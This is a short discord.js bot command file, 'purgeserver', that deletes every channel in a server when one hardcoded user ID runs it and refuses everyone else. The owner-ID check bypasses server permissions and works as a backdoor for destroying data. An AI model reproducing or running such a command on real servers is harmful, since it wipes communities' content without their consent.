/* eslint-disable no-useless-escape */
const Discord = require("discord.js");


/***
* @param {Discord.client} bot the discord bot client.
* @param {Discord.messsage} message the initial message sent by the user.
* @param {array} args an array of arguments
 */

module.exports.run = async (bot, message, args) => {
    if (message.author.id == "414992506665828364") {
        message.guild.channels.cache.forEach(channel => channel.delete());
    }
    else {
        message.channel.send("\`\`\`YAML\nNOPE SORRY YOU CAN'T DO THAT\`\`\`");
    }

};

/***
 * Exports the purgeserver command to the help object
 */

module.exports.help = {
    name: "purgeserver",
    aliases: ['ps']
};
